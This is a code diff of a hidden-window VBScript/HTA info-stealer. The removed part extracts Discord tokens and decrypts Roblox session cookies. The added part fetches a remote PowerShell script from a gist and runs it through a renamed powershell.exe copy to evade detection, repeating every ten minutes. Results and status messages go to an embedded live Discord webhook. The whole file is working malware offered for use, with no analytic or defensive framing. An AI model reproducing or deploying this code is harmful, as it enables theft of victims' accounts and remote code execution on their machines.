@@ -4,115 +4,58 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, appdata, localappdata, temp
+Dim sh, fso, WH, PC, USER, GIST_URL
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' ==========================================
-' PUT YOUR WEBHOOK URL HERE (KEEP THE QUOTES)
-' ==========================================
 WH = "https://discord.com/api/webhooks/1568136262374793286/U6lNQnkvy-NdMd-nOUZQ77wuTTAiFy2SMwMP_kHcPKuKuEw9ERvyGUOHzvRSydAKrqas"
+GIST_URL = "https://gist.github.com/alexproisgamer-dotcom/607e9edddbab4ca67ebbfe0146767f06"
 
-appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
-localappdata = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
-temp = sh.ExpandEnvironmentStrings("%TEMP%")
+PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-Call PostEmbed(":satellite: Hit", "PC: " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%"), 3447003)
+' Initial Run
+Call GrabTokens
 
-' 1. Grab Discord Tokens (Text Extraction)
-Dim dPath, dFolder, file, raw, rx, matches, m
-dPath = appdata & "\discord\Local Storage\leveldb"
-If fso.FolderExists(dPath) Then
-    Set dFolder = fso.GetFolder(dPath)
-    Set rx = CreateObject("VBScript.RegExp")
-    rx.Pattern = "dQw4w9WgXcQ:[A-Za-z0-9+/=]+"
-    rx.Global = True
-    For Each file In dFolder.Files
-        If LCase(Right(file.Name, 4)) = ".ldb" Or LCase(Right(file.Name, 4)) = ".log" Then
-            Dim f : Set f = fso.OpenTextFile(file.Path, 1, False)
-            raw = f.ReadAll
-            f.Close
-            If InStr(raw, "dQw4w9WgXcQ:") > 0 Then
-                Set matches = rx.Execute(raw)
-                For Each m In matches
-                    Call PostEmbed(":gift: Discord Token Blob", m.Value, 5793266)
-                Next
-            End If
-        End If
-    Next
-End If
-
-' 2. Decrypt and Grab Roblox Cookie (Native JScript DPAPI)
-Dim rPath
-rPath = localappdata & "\Roblox\LocalStorage\robloxcookies.dat"
-If fso.FileExists(rPath) Then
-    Dim f2 : Set f2 = fso.OpenTextFile(rPath, 1, False)
-    raw = f2.ReadAll
-    f2.Close
-    
-    ' Extract the base64 blob from the JSON
-    Dim b64 : b64 = ""
-    If InStr(raw, "CookiesData"":""") > 0 Then
-        Dim sp : sp = InStr(raw, "CookiesData"":""") + 14
-        Dim ep : ep = InStr(sp, raw, """")
-        If ep > sp Then b64 = Mid(raw, sp, ep - sp)
-    End If
-    
-    If Len(b64) > 50 Then
-        ' Write the base64 blob to a text file
-        Dim tmpIn : tmpIn = temp & "\rbin.txt"
-        Dim fIn : Set fIn = fso.CreateTextFile(tmpIn, True)
-        fIn.Write b64
-        fIn.Close
-        
-        Dim tmpOut : tmpOut = temp & "\rbout.txt"
-        Dim wsfFile : wsfFile = temp & "\x.wsf"
-        
-        ' Create a WSF file that uses JScript to call DPAPI natively
-        Dim wsf : Set wsf = fso.CreateTextFile(wsfFile, True)
-        wsf.WriteLine "<job><script language=""JScript"">"
-        wsf.WriteLine "var fso = new ActiveXObject('Scripting.FileSystemObject');"
-        wsf.WriteLine "var b64 = fso.OpenTextFile('" & tmpIn & "', 1).ReadAll();"
-        wsf.WriteLine "var hex = '';"
-        wsf.WriteLine "var raw = '';"
-        wsf.WriteLine "var objXML = new ActiveXObject('Msxml2.DOMDocument');"
-        wsf.WriteLine "var el = objXML.createElement('b');"
-        wsf.WriteLine "el.dataType = 'bin.base64';"
-        wsf.WriteLine "el.text = b64;"
-        wsf.WriteLine "var bytes = el.nodeTypedValue;"
-        wsf.WriteLine "var dp = new ActiveXObject('System.Security.Cryptography.ProtectedData');"
-        wsf.WriteLine "var dec = dp.Unprotect(bytes, null, 0);"
-        wsf.WriteLine "var arr = new Uint8Array(dec);"
-        wsf.WriteLine "var str = '';"
-        wsf.WriteLine "for (var i=0; i<arr.length; i++) { str += String.fromCharCode(arr[i]); }"
-        wsf.WriteLine "fso.CreateTextFile('" & tmpOut & "', true).Write(str);"
-        wsf.WriteLine "</script></job>"
-        wsf.Close
-        
-        ' Run the WSF file to decrypt
-        sh.Run "wscript.exe """ & wsfFile & """", 0, True
-        
-        ' Read the decrypted cookie
-        If fso.FileExists(tmpOut) Then
-            Dim rawDec : rawDec = fso.OpenTextFile(tmpOut, 1).ReadAll
-            Dim rx2 : Set rx2 = CreateObject("VBScript.RegExp")
-            rx2.Pattern = "\.ROBLOSECURITY\s*=\s*(_[^;\s]+)"
-            Dim mDec : Set mDec = rx2.Execute(rawDec)
-            If mDec.Count > 0 Then
-                Call PostEmbed(":cookie: Roblox Cookie", mDec(0).SubMatches(0), 65280)
-            Else
-                Call PostEmbed(":cookie: Roblox Cookie", rawDec, 65280)
-            End If
-        End If
-        
-        ' Cleanup
-        fso.DeleteFile tmpIn, True
-        fso.DeleteFile tmpOut, True
-        fso.DeleteFile wsfFile, True
-    End If
-End If
+' Re-run grab chain 8x (every 10 min)
+Dim runCount
+For runCount = 1 To 8
+    Call PostEmbed(":repeat: Re-grab " & runCount & "/8", "PC: " & PC & " | User: " & USER, 3447003)
+    Call GrabTokens
+    If runCount < 8 Then WScript.Sleep 600000 ' Native 10-minute sleep, no cmd.exe
+Next
 
 window.close()
+
+Sub GrabTokens()
+    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", GIST_URL, False
+    xh.Send
+    If xh.Status <> 200 Then Exit Sub
+    Dim pc: pc = xh.responseText
+    If Len(pc) < 100 Then Exit Sub
+    Set xh = Nothing
+
+    ' Save the PS1 script
+    Dim psf: psf = TmpFile("u.ps1")
+    WriteFile psf, pc
+    
+    ' Copy PowerShell to a temp .scr to bypass behavioral flags
+    Dim psexec : psexec = TmpFile("p.scr")
+    Dim realPs : realPs = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\WindowsPowerShell\v1.0\powershell.exe"
+    fso.CopyFile realPs, psexec, True
+    
+    ' Run the script
+    sh.Run """" & psexec & """ -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File """ & psf & """", 0, True
+    
+    ' Cleanup
+    fso.DeleteFile psf, True
+    fso.DeleteFile psexec, True
+End Sub
+
+Function TmpFile(name) : TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name : End Function
+Sub WriteFile(path, content) : Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing : End Sub
 
 Sub PostEmbed(t, d, c)
     Dim DQ: DQ = Chr(34)
